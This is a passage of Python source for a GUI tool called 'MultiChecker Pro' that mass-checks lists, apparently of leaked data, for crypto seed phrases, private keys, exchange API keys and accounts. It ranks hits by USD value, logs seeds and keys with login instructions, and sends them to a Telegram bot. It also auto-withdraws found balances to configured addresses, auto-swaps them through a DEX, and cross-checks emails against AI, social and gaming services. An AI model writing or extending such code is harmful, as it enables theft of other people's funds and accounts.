        if self.theme_sw.get():
            ctk.set_appearance_mode("light")
        else:
            ctk.set_appearance_mode("dark")

    def _get_config_path(self):
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

    def _load_config(self):
        config_path = self._get_config_path()
        if not os.path.isfile(config_path):
            return
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                cfg = json.load(f)
        except Exception:
            return

        theme = cfg.get("theme", "dark")
        ctk.set_appearance_mode(theme)
        if theme == "light":
            self.theme_sw.select()
        else:
            self.theme_sw.deselect()

        lang = cfg.get("lang", "ru")
        if lang != i18n.current_lang:
            i18n.set_lang(lang)
            self._refresh_text()
        if lang == "ru":
            self.lang_sw.select()
        else:
            self.lang_sw.deselect()

        for tab_name, w in self.tab_widgets.items():
            threads = cfg.get("threads", "100")
            w["threads"].delete(0, "end")
            w["threads"].insert(0, str(threads))

            timeout = cfg.get("timeout", "10")
            w["timeout"].delete(0, "end")
            w["timeout"].insert(0, str(timeout))

            proxy = cfg.get("proxy", "")
            if proxy:
                w["proxy"].delete(0, "end")
                w["proxy"].insert(0, proxy)

            tg_token = cfg.get("tg_token", "")
            tg_chat_id = cfg.get("tg_chat_id", "")
            if tg_token:
                w["tg_token"].delete(0, "end")
                w["tg_token"].insert(0, tg_token)
            if tg_chat_id:
                w["tg_chat_id"].delete(0, "end")
                w["tg_chat_id"].insert(0, tg_chat_id)

    def _save_config(self):
        config_path = self._get_config_path()
        first_tab = list(self.tab_widgets.keys())[0]
        w = self.tab_widgets[first_tab]

        cfg = {
            "theme": "light" if self.theme_sw.get() else "dark",
            "lang": i18n.current_lang,
            "threads": w["threads"].get().strip(),
            "timeout": w["timeout"].get().strip(),
            "proxy": w["proxy"].get().strip(),
            "tg_token": w["tg_token"].get().strip(),
            "tg_chat_id": w["tg_chat_id"].get().strip(),
        }

        try:
            with open(config_path, "w", encoding="utf-8") as f:
                json.dump(cfg, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def _on_close(self):
        self._save_config()
        self.destroy()

    def _refresh_text(self):
        self.title(f"MultiChecker Pro  v{APP_VERSION}")
        fl = [i18n.t("filter_all"), i18n.t("filter_valid"),
              i18n.t("filter_invalid"), i18n.t("filter_errors"),
              i18n.t("filter_balance")]
        fk = ["all", "valid", "invalid", "error", "balance"]
        for tab_name, w in self.tab_widgets.items():
            w["pill"].configure(text=f"● {i18n.t('ready')}")
            w["filter_seg"].configure(values=fl)
            cur = w.get("_filter", "all")
            w["filter_seg"].set(fl[fk.index(cur) if cur in fk else 0])

    def import_file(self, w):
        path = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        try:
            tab = self._tab_of(w)
            lines = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                while True:
                    chunk = f.readlines(1_000_000)
                    if not chunk:
                        break
                    lines.extend(l.strip() for l in chunk if l.strip())
            total = len(lines)
            self._loaded_data[tab] = lines
            w["input"].delete("1.0", "end")
            if total <= _TEXTBOX_DISPLAY_LIMIT:
                w["input"].insert("1.0", "\n".join(lines))
            else:
                w["input"].insert("1.0",
                    "\n".join(lines[:_TEXTBOX_DISPLAY_LIMIT]) +
                    f"\n\n... [{total - _TEXTBOX_DISPLAY_LIMIT} строк ещё] ...")
            self.log(w, i18n.t("file_loaded").format(total))
        except Exception as e:
            self.log(w, f"Import error: {e}")

    def _paste_clipboard(self, w):
        try:
            text = self.clipboard_get()
            if text.strip():
                w["input"].delete("1.0", "end")
                w["input"].insert("1.0", text)
                lines = [l.strip() for l in text.split("\n") if l.strip()]
                tab = self._tab_of(w)
                self._loaded_data[tab] = lines
                self.log(w, f"Clipboard: {len(lines)} lines pasted")
        except Exception:
            pass

    def export_results(self, w, fmt="txt"):
        if not self.results:
            self.log(w, i18n.t("no_results"))
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"valid_{ts}.{fmt}"
        try:
            if fmt == "json":
                with open(fn, "w", encoding="utf-8") as f:
                    json.dump(self.results, f, indent=2, ensure_ascii=False)
            elif fmt == "csv":
                with open(fn, "w", newline="", encoding="utf-8") as f:
                    wr = csv.DictWriter(f, fieldnames=self.results[0].keys())
                    wr.writeheader()
                    for r in self.results:
                        wr.writerow({k: json.dumps(v, ensure_ascii=False)
                                     if isinstance(v, dict) else v
                                     for k, v in r.items()})
            elif fmt == "xlsx":
                # Excel экспорт - НОВОЕ в v1.0.52
                from checkers.crypto_extensions import export_to_excel
                result_msg = export_to_excel(self.results, fn)
                self.log(w, result_msg)
                return
            else:
                with open(fn, "w", encoding="utf-8") as f:
                    for r in self.results:
                        f.write(json.dumps(r, ensure_ascii=False) + "\n")
            self.log(w, i18n.t("exported").format(fn))
        except Exception as e:
            self.log(w, f"Export error: {e}")

    def export_balance_only(self, w):
        balance_results = []
        for r in self.all_results:
            if not r:
                continue
            info = r.get("info", {})
            has_balance = False
            for key, val in info.items():
                if key.startswith("balance_") and isinstance(val, (int, float)) and val > 0:
                    has_balance = True
                    break
            if not has_balance and "balances" in info:
                for coin_data in info["balances"].values():
                    if isinstance(coin_data, dict) and coin_data.get("balance", 0) > 0:
                        has_balance = True
                        break
            if not has_balance and info.get("total_usd", 0) > 0:
                has_balance = True
            if not has_balance and "chains" in info:
                for chain_data in info["chains"].values():
                    if isinstance(chain_data, dict) and chain_data.get("balance", 0) > 0:
                        has_balance = True
                        break
            if has_balance:
                balance_results.append(r)

        if not balance_results:
            self.log(w, i18n.t("no_balance_results"))
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"balance_{ts}.json"
        try:
            with open(fn, "w", encoding="utf-8") as f:
                json.dump(balance_results, f, indent=2, ensure_ascii=False)
            self.log(w, i18n.t("exported_balance").format(len(balance_results), fn))
        except Exception as e:
            self.log(w, f"Export error: {e}")

    def export_by_type(self, w, rtype_filter):
        filtered = []
        for r in self.all_results:
            if not r:
                continue
            curr_type = r.get("type", "")
            if rtype_filter == "seed" and curr_type == "seed":
                filtered.append(r)
            elif rtype_filter == "privkey" and curr_type in ("privkey_hex", "privkey_wif"):
                filtered.append(r)

        if not filtered:
            self.log(w, f"Экспорт отменён: данные по типу '{rtype_filter}' не найдены.")
            return

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        fn = f"manual_{rtype_filter}_{ts}.txt"
        try:
            with open(fn, "w", encoding="utf-8") as f:
                for r in filtered:
                    inp = r.get("input", "")
                    msg = r.get("info", {}).get("message", "")
                    f.write(f"{inp} | {msg}\n")
            self.log(w, i18n.t("exported").format(fn))
        except Exception as e:
            self.log(w, f"Export error: {e}")

    def remove_duplicates(self, w):
        tab = self._tab_of(w)
        if tab in self._loaded_data and self._loaded_data[tab]:
            raw = self._loaded_data[tab]
        else:
            txt = w["input"].get("1.0", "end").strip()
            if not txt:
                self.log(w, i18n.t("no_data_to_dedup"))
                return
            raw = [l.strip() for l in txt.split("\n") if l.strip()]
        orig = len(raw)
        seen, uniq = set(), []
        for line in raw:
            if line not in seen:
                seen.add(line); uniq.append(line)
        del seen
        dupes = orig - len(uniq)
        if dupes:
            self._loaded_data[tab] = uniq
            w["input"].delete("1.0", "end")
            total = len(uniq)
            if total <= _TEXTBOX_DISPLAY_LIMIT:
                w["input"].insert("1.0", "\n".join(uniq))
            else:
                w["input"].insert("1.0",
                    "\n".join(uniq[:_TEXTBOX_DISPLAY_LIMIT]) +
                    f"\n\n... [{total - _TEXTBOX_DISPLAY_LIMIT} строк ещё] ...")
            self.log(w, i18n.t("dedup_result").format(dupes, len(uniq)))
        else:
            self.log(w, i18n.t("dedup_no_dupes").format(orig))

    def _tab_of(self, w):
        for name, ww in self.tab_widgets.items():
            if ww is w:
                return name
        return "Unknown"

    def _safe_int(self, v, default):
        try:
            return int(v)
        except (TypeError, ValueError):
            return default

    def _estimate_usd(self, result):
        if not result:
            return 0.0
        info = result.get("info", {})
        total = info.get("total_usd", 0)
        if total:
            return float(total)
        total += info.get("token_usd", 0)
        _approx_prices = {
            "balance_btc": 60000, "balance_eth": 3000, "balance_sol": 150,
            "balance_bnb": 600, "balance_trx": 0.12, "balance_ltc": 80,
            "balance_xrp": 0.6, "balance_doge": 0.15, "balance_ada": 0.5,
            "balance_ton": 6, "balance_dash": 30,
        }
        for key, price in _approx_prices.items():
            val = info.get(key, 0)
            if val:
                total += float(val) * price
        if "balances" in info:
            for coin_data in info["balances"].values():
                if isinstance(coin_data, dict):
                    bal = coin_data.get("balance", 0)
                    if bal:
                        total += float(bal)
        if "chains" in info:
            for chain_data in info["chains"].values():
                if isinstance(chain_data, dict):
                    usd_val = chain_data.get("usd", 0)
                    if usd_val:
                        total += float(usd_val)
        return total

    def _notify_telegram(self, w, msg):
        token = w.get("tg_token")
        chat_id = w.get("tg_chat_id")
        if not token or not chat_id:
            return
        token_val = token.get().strip()
        chat_id_val = chat_id.get().strip()
        if not token_val or not chat_id_val:
            return
        enabled = w.get("tg_enabled")
        if enabled and not enabled.get():
            return
        import urllib.request
        import urllib.parse
        try:
            url = f"https://api.telegram.org/bot{token_val}/sendMessage"
            data = urllib.parse.urlencode({"chat_id": chat_id_val, "text": msg, "parse_mode": "HTML"}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            urllib.request.urlopen(req, timeout=5)
            self.after(0, lambda: self.log(w, i18n.t("tg_sent")))
        except Exception as e:
            self.after(0, lambda: self.log(w, i18n.t("tg_error").format(str(e)[:60])))

    def _normalize(self, line, tab):
        raw = line.strip()
        if not raw:
            return ""
        try:
            if tab == "Crypto" and ":" not in raw and "/" not in raw and "|" not in raw:
                return raw

            cleaned = raw.replace("|", ":")

            if tab == "Email":
                m = re.search(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", cleaned)
                if m:
                    return m.group(0)

            url_match = re.match(r"(https?://[^\s:]+)", cleaned)
            if url_match:
                url_part = url_match.group(1)
                rest = cleaned[len(url_part):]
                rest_tokens = [t.strip() for t in rest.split(":") if t.strip()]
                if tab == "Email":
                    for t in rest_tokens:
                        if "@" in t and "." in t.split("@")[-1]:
                            return t
                    return ""
                if tab in {"Social", "Games", "AI"}:
                    if rest_tokens:
                        return rest_tokens[0]
                    bits = [p for p in urlparse(url_part).path.split("/") if p]
                    return bits[-1] if bits else ""
                if rest_tokens:
                    return rest_tokens[0]

            tokens = [t.strip() for t in cleaned.split(":") if t.strip()
                      and t.strip() not in {"http", "https", "//"}]

            if tab == "Email":
                for t in tokens:
                    if "@" in t and "." in t.split("@")[-1]:
                        return t
                return ""

            if tab in {"Social", "Games", "AI"}:
                cands = [t for t in tokens
                         if not t.lower().startswith("http") and "." not in t]
                if cands:
                    return cands[0]
                return tokens[0] if tokens else raw

            return tokens[0] if tokens else raw
        except Exception:
            return raw

    def _fast_crypto_filter(self, raw_lines, w):
        from checkers.crypto_checker import _WALLET_PATTERNS, _WALLET_FIRST_CHARS
        exchanges = ("binance","bybit","okx","huobi","kucoin","gate.io","mexc","bitget")
        seen, data = set(), []
        total = len(raw_lines)
        ri = max(total // 10, 1_000_000)
        for idx, line in enumerate(raw_lines):
            s = line.strip()
            if not s:
                continue
            if idx % ri == 0 and idx > 0:
                pct = idx * 100 // total
                self.after(0, lambda p=pct, i=idx, t=total: self.log(
                    w, f"Сканирование... {p}% ({i}/{t})"))
            domain = ""
            if "://" in s:
                domain = s.split("://",1)[1].split("/",1)[0].split(":",1)[0].lower()
            elif "." in s.split(":",1)[0]:
                domain = s.split(":",1)[0].split("/",1)[0].lower()
            if domain:
                for ex in exchanges:
                    if ex in domain:
                        if s not in seen:
                            seen.add(s); data.append(s)
                        break
                else:
                    self._scan_wallets(s, _WALLET_FIRST_CHARS, _WALLET_PATTERNS, seen, data)
            else:
                self._scan_wallets(s, _WALLET_FIRST_CHARS, _WALLET_PATTERNS, seen, data)
        del seen
        self.after(0, lambda: self.log(w, f"Найдено {len(data)} крипто-записей из {total} строк"))
        return data

    @staticmethod
    def _scan_wallets(line, first_chars, patterns, seen, data):
        for token in line.split(":"):
            if len(token) < 25 or len(token) > 95:
                continue
            if "/" in token:
                token = token.rsplit("/", 1)[-1]
                if len(token) < 25:
                    continue
            if token[0] not in first_chars:
                continue
            for _, pat in patterns:
                if pat.match(token):
                    if token not in seen:
                        seen.add(token); data.append(token)
                    return

    def start_check(self, tab_name):
        w = self.tab_widgets[tab_name]
        if tab_name in self._loaded_data and self._loaded_data[tab_name]:
            raw = self._loaded_data[tab_name]
        else:
            raw = w["input"].get("1.0", "end").strip().split("\n")
        if not raw or (len(raw) == 1 and not raw[0].strip()):
            self.log(w, i18n.t("no_data")); return

        threads = self._safe_int(w["threads"].get().strip(), 100)
        timeout = self._safe_int(w["timeout"].get(), 10)
        proxy   = w["proxy"].get().strip()

        self.is_running = True
        self.results = []; self.all_results = []; self._platform_stats = {}
        w["_log_lines"] = []; w["_filter"] = "all"
        w["filter_seg"].set(i18n.t("filter_all"))
        self._update_counters(w, 0, 0, 0, 0)
        w["output"].delete("1.0", "end")
        w["pill"].configure(text="⟳ Проверка...", text_color=ACCENT)
        self._sb_status.configure(text="⟳ Проверка...", text_color=ACCENT)
        w["progress"].set(0)
        w["progress_lbl"].configure(text="0% (0/0)")
        self.log(w, i18n.t("preparing_data"))
        threading.Thread(target=self._run,
                         args=(raw, tab_name, threads, timeout, proxy, w),
                         daemon=True).start()

    def _run(self, raw, tab_name, threads, timeout, proxy, w):
        try:
            orig = len(raw)
            if tab_name == "Crypto":
                data = self._fast_crypto_filter(raw, w)
            elif tab_name == "All":
                seen, data = set(), []
                for line in raw:
                    s = line.strip()
                    if s and s not in seen:
                        seen.add(s); data.append(s)
                del seen
            else:
                seen, data = set(), []
                for item in (self._normalize(d, tab_name) for d in raw if d.strip()):
                    if item and item not in seen:
                        seen.add(item); data.append(item)
                del seen

            dupes = orig - len(data)
            if not data:
                self.after(0, lambda: self.log(w, i18n.t("no_data")))
                self.after(0, lambda: w["pill"].configure(
                    text=f"● {i18n.t('ready')}", text_color=GREEN))
                return
            if dupes > 0:
                self.after(0, lambda: self.log(w, i18n.t("duplicates_removed").format(dupes)))
            if tab_name == "All":
                self.after(0, lambda: self.log(w, i18n.t("starting_all").format(
                    len(data), 5, len(data)*5, threads)))
            else:
                self.after(0, lambda: self.log(w, i18n.t("starting").format(len(data), threads)))

            # Настройка автовывода для Crypto
            if tab_name == "Crypto" and "auto_withdraw_enabled" in w:
                if w["auto_withdraw_enabled"].get():
                    addresses = {}
                    min_amounts = {}
                    
                    eth_addr = w["withdraw_eth"].get().strip()
                    btc_addr = w["withdraw_btc"].get().strip()
                    trx_addr = w["withdraw_trx"].get().strip()
                    sol_addr = w["withdraw_sol"].get().strip()
                    
                    if eth_addr:
                        addresses["ethereum"] = eth_addr
                        addresses["bsc"] = eth_addr
                        addresses["polygon"] = eth_addr
                        addresses["avalanche"] = eth_addr
                        addresses["base"] = eth_addr
                        addresses["arbitrum"] = eth_addr
                        addresses["optimism"] = eth_addr
                    if btc_addr:
                        addresses["bitcoin"] = btc_addr
                    if trx_addr:
                        addresses["tron"] = trx_addr
                    if sol_addr:
                        addresses["solana"] = sol_addr
                    
                    try:
                        min_amounts["ethereum"] = float(w["min_eth"].get().strip() or "0.01")
                        min_amounts["bsc"] = min_amounts["ethereum"]
                        min_amounts["polygon"] = min_amounts["ethereum"]
                        min_amounts["avalanche"] = min_amounts["ethereum"]
                        min_amounts["bitcoin"] = float(w["min_btc"].get().strip() or "0.001")
                        min_amounts["tron"] = float(w["min_trx"].get().strip() or "10")
                        min_amounts["solana"] = float(w["min_sol"].get().strip() or "0.1")
                    except ValueError:
                        self.after(0, lambda: self.log(w, "⚠️ Ошибка в минимальных суммах, используются значения по умолчанию"))
                        min_amounts = {
                            "ethereum": 0.01, "bsc": 0.01, "polygon": 0.01,
                            "bitcoin": 0.001, "tron": 10, "solana": 0.1
                        }
                    
                    if addresses:
                        self.checkers["Crypto"].enable_auto_withdraw(addresses, min_amounts)
                        self.after(0, lambda: self.log(w, f"✓ Автовывод включен на {len(addresses)} сетей"))
                    else:
                        self.after(0, lambda: self.log(w, "⚠️ Автовывод включен, но адреса не указаны"))
                else:
                    self.checkers["Crypto"].disable_auto_withdraw()
            
            # Настройка автообмена для Crypto
            if tab_name == "Crypto" and "auto_swap_enabled" in w:
                if w["auto_swap_enabled"].get():
                    try:
                        target_token = w["swap_target"].get().strip()
                        min_usd = float(w["swap_min_usd"].get().strip() or "1.0")
                        slippage = float(w["swap_slippage"].get().strip() or "1.0")
                        dex = w["swap_dex"].get().strip().lower()
                        
                        self.checkers["Crypto"].enable_auto_swap(
                            target_token=target_token,
                            min_value_usd=min_usd,
                            slippage=slippage,
                            dex=dex
                        )
                        self.after(0, lambda: self.log(w, f"✓ Автообмен включен: {target_token} через {dex.capitalize()}"))
                    except ValueError as e:
                        self.after(0, lambda: self.log(w, f"⚠️ Ошибка настроек автообмена: {e}"))
                else:
                    self.checkers["Crypto"].disable_auto_swap()
            
            # Начать сессию статистики для Crypto
            if tab_name == "Crypto":
                self.checkers["Crypto"].start_session()

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._check_all(data, tab_name, threads, timeout, proxy, w))
        except Exception as e:
            self.after(0, lambda: self.log(w, f"Error: {e}"))
            self.after(0, lambda: w["pill"].configure(
                text=f"● {i18n.t('ready')}", text_color=GREEN))
        finally:
            self.is_running = False
            self.after(0, lambda: self._sb_status.configure(text="● Готов", text_color=GREEN))

    async def _check_all(self, data, tab_name, threads, timeout, proxy, w):
        sem  = asyncio.Semaphore(threads)
        cats = ["Email", "Social", "Crypto", "Games", "AI"]
        total = len(data) * len(cats) if tab_name == "All" else len(data)
        done  = [0]; valid = [0]; inv = [0]; err = [0]
        done_proxy_idx = [0]
        upd   = max(1, total // 2000)

        proxies = []
        if proxy:
            if os.path.isfile(proxy):
                try:
                    with open(proxy) as f:
                        proxies = [l.strip() for l in f if l.strip()]
                except Exception:
                    pass
            else:
                proxies = [proxy]

        conn = aiohttp.TCPConnector(limit=threads*2,
                                    limit_per_host=min(threads,50),
                                    ttl_dns_cache=300, force_close=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            async def task(item, cat=None):
                async with sem:
                    if not self.is_running:
                        return None
                    p = proxies[done_proxy_idx[0] % len(proxies)] if proxies else None
                    done_proxy_idx[0] += 1
                    
                    cat_ = cat or tab_name
                    it   = item
                    if cat:
                        it = self._normalize(item, cat_)
                        if not it:
                            done[0] += 1
                            return None
                    res = await self._check_item(it, cat_, timeout, p, session)
                    done[0] += 1
                    if res:
                        tag = res.get("platform", res.get("service", res.get("wallet_type","")))
                        inp = res.get("input", res.get("email",""))
                        if res.get("info",{}).get("error"):
                            err[0] += 1
                            msg = res["info"]["error"]
                            self.after(0, lambda t=tag,i=inp,m=msg: self.log_tagged(
                                w,"error",f"[!] [{t}] {i} — {m}"))
                        elif res.get("exists"):
                            valid[0] += 1
                            self._platform_stats[tag] = self._platform_stats.get(tag,0)+1
                            msg = res.get("info",{}).get("message","")
                            self.after(0, lambda t=tag,i=inp,m=msg: self.log_tagged(
                                w,"valid",f"[+] [{t}] {i} — {m}"))
                            
                            rtype = res.get("type", "")
                            if rtype in ("seed", "privkey_hex", "privkey_wif"):
                                filename = "seeds_valid.txt" if rtype == "seed" else "privkeys_valid.txt"
                                try:
                                    with open(filename, "a", encoding="utf-8") as f_out:
                                        auth = res.get("info", {}).get("auth", {})
                                        f_out.write(f"=== Найдено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                                        f_out.write(f"Ключ/Фраза: {inp}\n")
                                        f_out.write(f"Результат: {msg}\n")
                                        if auth:
                                            f_out.write(f"ИНСТРУКЦИЯ ПО ВХОДУ:\n")
                                            f_out.write(f"  • Куда заходить: {auth.get('wallets', '')}\n")
                                            f_out.write(f"  • Тип импорта: {auth.get('auth_type', '')}\n")
                                            f_out.write(f"  • Как войти: {auth.get('how', '')}\n")
                                        f_out.write("-" * 70 + "\n")
                                except Exception:
                                    pass

                            auth = res.get("info",{}).get("auth")
                            if auth:
                                self.after(0, lambda a=auth: self.log_tagged(w,"valid",
                                    f"    ↳ {i18n.t('auth_type')}: {a['auth_type']}"))
                                self.after(0, lambda a=auth: self.log_tagged(w,"valid",
                                    f"    ↳ {i18n.t('auth_wallets')}: {a['wallets']}"))
                                self.after(0, lambda a=auth: self.log_tagged(w,"valid",
                                    f"    ↳ {i18n.t('auth_how')}: {a['how']}"))
                            linked = res.get("info",{}).get("linked_services",[])
                            if linked:
                                svc = ", ".join(s["service"] for s in linked)
                                self.after(0, lambda i=inp,s=svc: self.log_tagged(
                                    w,"valid",f"    ↳ {i18n.t('linked')}: {s}"))
                                for sv in linked:
                                    self.after(0, lambda n=sv["service"],m2=sv.get("message",""): self.log_tagged(
                                        w,"valid",f"      • {n}: {m2}"))
                        else:
                            inv[0] += 1
                            msg = res.get("info",{}).get("message","Not found")
                            self.after(0, lambda t=tag,i=inp,m=msg: self.log_tagged(
                                w,"invalid",f"[-] [{t}] {i} — {m}"))
                    
                    if done[0] % upd == 0 or done[0] == total:
                        pv = done[0]/total
                        pct_text = f"{int(pv * 100)}% ({done[0]}/{total})"
                        vv,iv,ev = valid[0],inv[0],err[0]
                        self.after(0, lambda p=pv, t=pct_text: (w["progress"].set(p), w["progress_lbl"].configure(text=t)))
                        self.after(0, lambda: self._update_counters(w,vv,iv,ev,done[0]))
                    return res

            results, batch = [], []
            def flush():
                nonlocal batch
                t = ([task(i,c) for i,c in batch] if tab_name=="All"
                     else [task(i) for i,_ in batch])
                batch = []; return t

            if tab_name == "All":
                for item in data:
                    for c in cats:
                        batch.append((item,c))
                        if len(batch) >= _GATHER_BATCH_SIZE:
                            if not self.is_running: break
                            results.extend(await asyncio.gather(*flush()))
                    if not self.is_running: break
            else:
                for item in data:
                    batch.append((item,None))
                    if len(batch) >= _GATHER_BATCH_SIZE:
                        if not self.is_running: break
                        results.extend(await asyncio.gather(*flush()))
            if batch and self.is_running:
                results.extend(await asyncio.gather(*flush()))

        self.all_results = [r for r in results if r]
        self.results     = [r for r in self.all_results if r.get("exists")]
        del results
        
        # Обновляем статистику сессии для Crypto
        if tab_name == "Crypto":
            for r in self.all_results:
                self.checkers["Crypto"].update_session_stats(r)

        self.results.sort(key=lambda r: self._estimate_usd(r), reverse=True)

        for r in self.results:
            est = self._estimate_usd(r)
            rtype = r.get("type", "")
            notify_threshold = 0 if rtype in ("seed", "privkey_hex", "privkey_wif", "exchange_api") else 100
            if est > notify_threshold:
                inp = r.get("input", "")[:30]
                msg_text = r.get("info", {}).get("message", "")
                if rtype == "seed":
                    tg_msg = f"<b>🌱 Seed Phrase with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                elif rtype == "privkey_hex":
                    tg_msg = f"<b>🔑 Private Key with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                elif rtype == "privkey_wif":
                    tg_msg = f"<b>🔑 WIF Key with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                elif rtype == "exchange_api":
                    tg_msg = f"<b>🏦 Exchange API key!</b>\n{inp}\n{msg_text[:200]}"
                else:
                    tg_msg = f"<b>💰 Balance found!</b>\n{inp}\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                self._notify_telegram(w, tg_msg)

        total_portfolio = sum(self._estimate_usd(r) for r in self.results)
        if self.results:
            summary = i18n.t("summary_line").format(len(self.results), f"{total_portfolio:,.2f}")
            self.after(0, lambda s=summary: self.log_tagged(w, "system", s))

        vv,iv,ev = valid[0],inv[0],err[0]
        self.after(0, lambda: self._update_counters(w,vv,iv,ev,total))
        self.after(0, lambda: w["pill"].configure(
            text=f"● {i18n.t('ready')}", text_color=GREEN))
        self.log(w, i18n.t("completed").format(len(self.results), total))
        self.log(w, "─" * 64)

    async def _check_item(self, item, tab_name, timeout, proxy, session):
        checker = self.checkers.get(tab_name)
        try:
            res = await checker.check(item, timeout=timeout, proxy=proxy, session=session)
            if tab_name == "Email" and res.get("exists"):
                res["info"]["linked_services"] = await self._cross_email(
                    item, timeout, proxy, session)
            return res
        except Exception as e:
            return {"input": item, "exists": False, "info": {"error": str(e)}}

    async def _cross_email(self, email, timeout, proxy, session):
        u = email.split("@")[0]
        checks = [
            ("chatgpt",    self.checkers["AI"]._check_openai,      email),
            ("gemini",     self.checkers["AI"]._check_gemini,      email),
            ("perplexity", self.checkers["AI"]._check_perplexity,  email),
            ("claude",     self.checkers["AI"]._check_claude,      email),
            ("github",     self.checkers["Social"]._check_github,    u),
            ("instagram",  self.checkers["Social"]._check_instagram, u),
            ("twitter",    self.checkers["Social"]._check_twitter,   u),
            ("tiktok",     self.checkers["Social"]._check_tiktok,    u),
            ("reddit",     self.checkers["Social"]._check_reddit,    u),
            ("vk",         self.checkers["Social"]._check_vk,        u),
            ("telegram",   self.checkers["Social"]._check_telegram,  u),
            ("steam",      self.checkers["Games"]._check_steam,       u),
            ("epic",       self.checkers["Games"]._check_epic,        u),
            ("xbox",       self.checkers["Games"]._check_xbox,        u),
            ("playstation",self.checkers["Games"]._check_playstation, u),
        ]
        async def _run(name, fn, d):
            try:
                r = await fn(d, timeout, proxy, session)
                if r.get("exists"):
                    return {"service": name, "found": True,
                            "message": r.get("info",{}).get("message","")}
            except Exception:
                pass
            return None
        return [r for r in await asyncio.gather(*[_run(n,f,d) for n,f,d in checks]) if r]

    def _update_counters(self, w, valid, inv, err, total):
        w["cnt_valid"].configure(text=str(valid))
        w["cnt_invalid"].configure(text=str(inv))
        w["cnt_errors"].configure(text=str(err))
        w["cnt_total"].configure(text=str(total))

    def log_tagged(self, w, tag, msg):
        ll = w.setdefault("_log_lines", [])
        ll.append((tag, msg))
        if len(ll) > _MAX_LOG_LINES:
            w["_log_lines"] = ll[-_MAX_LOG_LINES:]
        cur_filter = w.get("_filter", "all")
        if cur_filter in ("all", tag):
            self._log_safe(w, msg, tag)
        elif cur_filter == "balance" and tag == "valid" and "(empty)" not in msg:
            self._log_safe(w, msg, tag)

    def _on_filter(self, w, value):
        mapping = {
            i18n.t("filter_all"):     "all",
            i18n.t("filter_valid"):   "valid",
            i18n.t("filter_invalid"): "invalid",
            i18n.t("filter_errors"):  "error",
            i18n.t("filter_balance"): "balance",
        }
        ft = mapping.get(value, "all")
        w["_filter"] = ft
        w["output"].delete("1.0", "end")
        
        lines_to_show = []
        for tag, line in w.get("_log_lines", []):
            if ft == "all" or tag == ft or tag == "system":
                lines_to_show.append((line, tag))
            elif ft == "balance" and tag == "valid" and ("Balance:" in line or "balance" in line.lower()):
                if "(empty)" not in line:
                    lines_to_show.append((line, tag))

        def insert_batch(index=0):
            if w.get("_filter") != ft:
                return
            batch = lines_to_show[index:index+200]
            if batch:
                for line, tag in batch:
                    try:
                        w["output"].insert("end", f"{line}\n", tag)
                    except Exception:
                        pass
                try:
                    w["output"].see("end")
                except Exception:
                    pass
                self.after(10, lambda: insert_batch(index + 200))

        insert_batch(0)

    def stop_check(self):
        self.is_running = False

    def clear_output(self, w):
        w["output"].delete("1.0", "end")
        w["input"].delete("1.0", "end")
        w["progress"].set(0)
        w["progress_lbl"].configure(text="0% (0/0)")
        self._update_counters(w, 0, 0, 0, 0)
        w["_log_lines"] = []; w["_filter"] = "all"
        w["filter_seg"].set(i18n.t("filter_all"))
        self._loaded_data.pop(self._tab_of(w), None)

    def log(self, w, msg):
        w.setdefault("_log_lines", []).append(("system", msg))
        self.after(0, lambda: self._log_safe(w, msg, "system"))

    def _log_safe(self, w, msg, tag="system"):
        try:
            w["output"].insert("end", f"{msg}\n", tag)
            w["output"].see("end")
        except Exception:
            pass

    def show_stats(self, tab_name):
        w = self.tab_widgets[tab_name]
        if not self.all_results:
            self.log(w, i18n.t("stats_no_data")); return

        # Для Crypto показываем расширенную статистику
        if tab_name == "Crypto":
            self._show_crypto_extended_stats(w)
            return

        win = ctk.CTkToplevel(self)
        win.title(i18n.t("stats_title"))
        win.geometry("540x520")
        win.configure(fg_color=BG)
        win.attributes("-topmost", True)

        valid  = len([r for r in self.all_results if r.get("exists")])
        errors = len([r for r in self.all_results if r.get("info",{}).get("error")])
        inv    = len(self.all_results) - valid - errors
        total  = len(self.all_results)

        ctk.CTkLabel(win, text=i18n.t("stats_title"),
                     font=("Segoe UI", 18, "bold"), text_color=TEXT
                     ).pack(pady=(20, 12))

        cf = ctk.CTkFrame(win, fg_color="transparent")
        cf.pack(padx=20, fill="x")
        cf.grid_columnconfigure((0,1,2), weight=1)
        for col, (lbl, cnt, clr) in enumerate([
            (i18n.t("valid"),   valid,  GREEN),
            (i18n.t("invalid"), inv,    RED),
            (i18n.t("errors"),  errors, YELLOW),
        ]):
            c = ctk.CTkFrame(cf, fg_color=CARD, corner_radius=12)
            c.grid(row=0, column=col, padx=4, sticky="ew")
            ctk.CTkLabel(c, text=lbl, font=("Segoe UI",11), text_color=MUTED).pack(pady=(10,0))
            ctk.CTkLabel(c, text=str(cnt), font=("Segoe UI",24,"bold"), text_color=clr).pack()
            pct = f"{cnt*100//total}%" if total else "0%"
            ctk.CTkLabel(c, text=pct, font=("Segoe UI",11), text_color=MUTED).pack(pady=(0,10))

        bc = ctk.CTkFrame(win, fg_color=CARD, corner_radius=10)
        bc.pack(padx=20, pady=12, fill="x")
        cv = Canvas(bc, width=480, height=110, bg=CARD, highlightthickness=0)
        cv.pack(pady=10, padx=10)
        mx = max(valid, inv, errors, 1)
        for lbl, cnt, clr, y in [
            (i18n.t("valid"),   valid,  GREEN,  8),
            (i18n.t("invalid"), inv,    RED,    44),
